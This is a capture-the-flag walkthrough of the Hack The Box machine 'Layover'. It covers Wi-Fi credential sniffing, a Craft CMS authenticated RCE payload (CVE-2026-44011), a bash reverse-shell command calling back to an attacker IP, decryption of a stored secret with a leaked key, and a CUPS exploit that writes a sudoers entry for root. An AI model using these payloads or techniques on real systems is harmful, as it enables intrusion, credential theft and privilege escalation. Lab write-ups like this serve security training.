---
title: Layover Hackthebox Machine
description: Layover Hackthebox Machine
date: '2026-09-27'
tags:
  - machine
  - pentesting
  - hackthebox
published: true
slug: layover-hackthebox-machine
category: Machine
platform: Hack The Box
difficulty: Medium
---
# Layover — Hack The Box Walkthrough

> **Platform:** Hack The Box  
> **Machine:** Layover  
> **Category:** Linux  
> **Techniques:** RDP access, wireless traffic capture, credential sniffing, Craft CMS exploitation, database enumeration, Craft/Yii decryption, SSH access, and CUPS privilege escalation

> [!NOTE]
> This walkthrough is intended for the authorized Hack The Box environment only. Replace interface names, IP addresses, BSSIDs, and callback addresses with values appropriate to your own lab session.

## Attack Path

```text
Provided contractor credentials
          │
          ▼
RDP access to a Linux workstation
          │
          ▼
Capture traffic from the local wireless network
          │
          ▼
Recover Jenny's portal credentials
          │
          ▼
Identify Craft CMS and access /admin
          │
          ▼
Exploit CVE-2026-44011 for command execution
          │
          ▼
Extract and decrypt the mail relay password
          │
          ▼
SSH as aporter
          │
          ▼
Exploit CUPS CVE-2026-34990
          │
          ▼
Root
```

## 1. Initial Enumeration

The machine starts with an IP address and the following credentials from the challenge description:

```text
Username: contractor
Password: Contractor2026!
```

A port scan shows that SSH and RDP are exposed. The supplied credentials do not work over SSH, but they do work over RDP, providing access to a Linux desktop environment.

Once connected, opening the browser reveals an internal website that is available only while the workstation is connected to the local Wi-Fi network. The site contains a login page. Although the page itself initially appears unremarkable, its use over the wireless network creates an opportunity to observe another user's authentication traffic.

## 2. Wireless Traffic Capture

### Identify the wireless interface

List the available wireless interfaces:

```bash
iwconfig
```

The relevant interface is `wlan3`, which is currently operating in managed mode.

### Enable monitor mode

Use `airmon-ng` to place the interface into monitor mode:

```bash
sudo airmon-ng start wlan3
```

This creates the monitor-mode interface `wlan3mon`.

### Capture nearby traffic

Start a packet capture with `airodump-ng`:

```bash
sudo airodump-ng wlan3mon -w CAPTURE
```

The scan reveals the `OPN` wireless network. After waiting for clients to connect and generate traffic, stop the capture with <kbd>Ctrl</kbd>+<kbd>C</kbd>. The capture is written to a file such as `CAPTURE-01.cap`.

### Optional: filter the capture by BSSID

To make analysis easier, use `airdecap-ng` to retain traffic associated with the target access point:

```bash
sudo airdecap-ng -b <TARGET_BSSID> CAPTURE-01.cap
```

Open the resulting capture in Wireshark and inspect the web traffic. The login request exposes the following credentials:

```text
Username: jenny
Password: Fl1ghtDeck2026!
```

![Credentials recovered from the packet capture](/images/writeups/layover-hackthebox-machine/image.png)

The credentials successfully authenticate to the normal portal, but that area does not expose anything useful by itself.

## 3. Discovering the Craft CMS Control Panel

The application's cookies reveal that the site is powered by **Craft CMS**. Craft's administrative control panel is commonly available at `/admin`, so navigate to:

```text
http://portal.international.htb/admin
```

The credentials recovered from the wireless capture work here as well:

```text
Username: jenny
Password: Fl1ghtDeck2026!
```

After logging in, the Craft CMS version is displayed at the bottom of the control panel. Searching for vulnerabilities affecting that version leads to **CVE-2026-44011**, an authenticated remote code-execution vulnerability.

Reference: [CVE-2026-44011 Craft CMS authenticated RCE](https://github.com/4xura/CVE-2026-44011-craftcms-auth-rce/tree/main)

## 4. Craft CMS Authenticated RCE — CVE-2026-44011

### Vulnerability overview

Craft CMS versions **4.0.0 through 4.17.11**, along with **5.x versions before 5.9.18**, contain an input-handling flaw in a Yii object-creation path. An authenticated attacker can submit malicious configuration data containing special keys that influence object instantiation before the parent constructor is called. This behavior can ultimately result in arbitrary command execution on the server.

The public proof of concept builds the malicious condition as follows:

```python
def injection_payload(element_type, site_id, command):
    # Craft 5.9.8 passes the condition to createCondition without cleansing it.
    payload = benign_payload(element_type, site_id)
    payload["condition"] = {
        "class": "craft\\elements\\conditions\\ElementCondition",
        "elementType": element_type,
        "fieldLayouts": [{
            "as poc": {
                "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                "__construct()": [{
                    "attributeTypes": {
                        "typecastBeforeSave": [
                            "Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"
                        ]
                    },
                    "typecastBeforeSave": command,
                }],
            },
            "on *": "self::beforeSave",
        }],
    }
    return payload
```

In short, the payload abuses Craft's condition construction and Yii's behavior configuration to invoke an attacker-controlled callable.

### Obtain a reverse shell

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Then run the proof of concept with Jenny's credentials. Replace `10.13.37.182` with the IP address of your VPN interface if necessary:

```bash
python3 script.py \
  -b http://portal.international.htb \
  -u jenny \
  -p 'Fl1ghtDeck2026!' \
  -c 'bash -c "bash -i >& /dev/tcp/10.13.37.182/4444 0>&1"'
```

When the payload executes, the listener receives a shell as `www-data`.

## 5. Database Enumeration

While enumerating the web application, the project `.env` file exposes database credentials and the Craft security key:

```text
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
```

Using the database credentials from that file, connect to MariaDB and select the `craft` database. Listing its tables reveals several potentially useful application-specific tables:

```sql
SHOW TABLES;
```

The database contains 72 tables, including:

```text
htbairways_settings
miles_members
sso_identities
users
```

### Inspect the Craft users

```sql
SELECT * FROM users;
```

This confirms the two Craft accounts:

| ID | Username | Name | Email | Admin |
|---:|---|---|---|:---:|
| 1 | `admin` | — | `admin@htb-international.htb` | Yes |
| 2 | `jenny` | Jenny Crawford | `jenny.crawford@htb-international.htb` | No |

The stored passwords are bcrypt hashes, so the application-specific settings table is a more promising target.

### Inspect the airline settings

```sql
SELECT * FROM htbairways_settings;
```

The table contains the mail relay configuration:

| Setting | Value |
|---|---|
| `mailRelayHost` | `mail.htbairways.htb` |
| `mailRelayPort` | `587` |
| `mailRelayUser` | `aporter` |
| `mailRelayPassword` | Base64-encoded encrypted blob |

Encrypted password value:

```text
u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
```

## 6. Decrypting the Mail Relay Password

Craft CMS uses Yii's `Security::encryptByKey()` method to encrypt sensitive values before saving them to the database. The corresponding `decryptByKey()` method can recover the plaintext when the same `CRAFT_SECURITY_KEY` is available.

The database value must first be Base64-decoded and then passed to `decryptByKey()` with the key recovered from `.env`.

Create the following PHP script on the target, where the Craft dependencies are already installed:

```php
<?php

define('CRAFT_BASE_PATH', '/var/www/portal');
define('CRAFT_VENDOR_PATH', CRAFT_BASE_PATH . '/vendor');

require CRAFT_VENDOR_PATH . '/autoload.php';

$key = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';
$encrypted = 'u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=';

$security = new \yii\base\Security();
$result = $security->decryptByKey(base64_decode($encrypted), $key);

echo $result . PHP_EOL;
```

Running the script reveals the mail relay password:

```text
Skyp0rt_Relay!26
```

## 7. SSH Access as `aporter`

Inspection of `/etc/passwd` shows that `aporter` is the relevant local user. The mail relay credentials are reused for the system account, allowing SSH access:

```bash
ssh aporter@portal.international.htb
```

Authenticate with:

```text
Skyp0rt_Relay!26
```

This provides a stable shell as `aporter`, from which the user flag can be retrieved.

## 8. Local Enumeration

Standard privilege-escalation checks do not immediately expose a path:

- `sudo -l` does not provide a useful sudo rule.
- The available SUID binaries appear normal.

Enumerating listening services is more productive:

```bash
ss -tulnp
```

Port `631` is listening locally. Query it with `curl`:

```bash
curl http://localhost:631
```

The response identifies **CUPS 2.4.16**.

## 9. CUPS Local Privilege Escalation: CVE-2026-34990

Researching local privilege-escalation issues affecting this version leads to **CVE-2026-34990**.

Reference: [CVE-2026-34990 proof of concept](https://github.com/0xc4rc3l/CVE-2026-34990-poc/tree/main)

### Vulnerability overview

OpenPrinting CUPS versions **2.4.16 and earlier** allow a local unprivileged user to coerce `cupsd` into authenticating to an attacker-controlled localhost IPP service with a reusable `Authorization: Local ...` token. The token can then be used for authenticated requests to the local `/admin/` interface.

The exploit combines this behavior with `CUPS-Create-Local-Printer` and `printer-is-shared=true` to persist a `file://` printer queue despite the normal `FileDevice` restrictions. Printing through that queue provides an arbitrary root file-write primitive. The public proof of concept uses this to create a sudoers entry and obtain root command execution.

### Configure and run the exploit

Set the attacking user to the current account:

```bash
export CUPS_ATTACKER="$USER"
```

Set the root-owned file that the exploit should create:

```bash
export CUPS_TARGET="/etc/sudoers.d/aporter"
```

Run the proof-of-concept script according to its repository instructions. If the race succeeds, CUPS writes a sudoers fragment granting `aporter` passwordless root access. Use the resulting sudo permission to start a root shell and retrieve the root flag from `/root`.

## 10. Conclusion

Layover combines several distinct attack surfaces into one chain. The initial contractor credentials provide desktop access but no direct SSH access. That workstation supplies proximity to a wireless network, where unencrypted authentication traffic leaks a second user's credentials. Those credentials unlock the Craft CMS control panel, and a version-specific authenticated RCE yields a web shell.

From there, database access and the Craft security key make it possible to decrypt an application secret. Password reuse turns that secret into SSH access as `aporter`. Finally, a locally exposed and vulnerable CUPS service provides an arbitrary root file-write primitive, which is used to grant passwordless sudo access and complete the escalation to root.

### Key takeaways

- Internal or wireless traffic should not be trusted merely because it is not Internet-facing.
- Credentials captured for one application may expose a more privileged administrative interface.
- Product and version disclosure significantly simplifies vulnerability research.
- Encryption at rest does not protect secrets when the application key is readable from the same host.
- Service-account password reuse can convert an application compromise into operating-system access.
- Local-only services still require patching because an existing foothold can make them reachable.
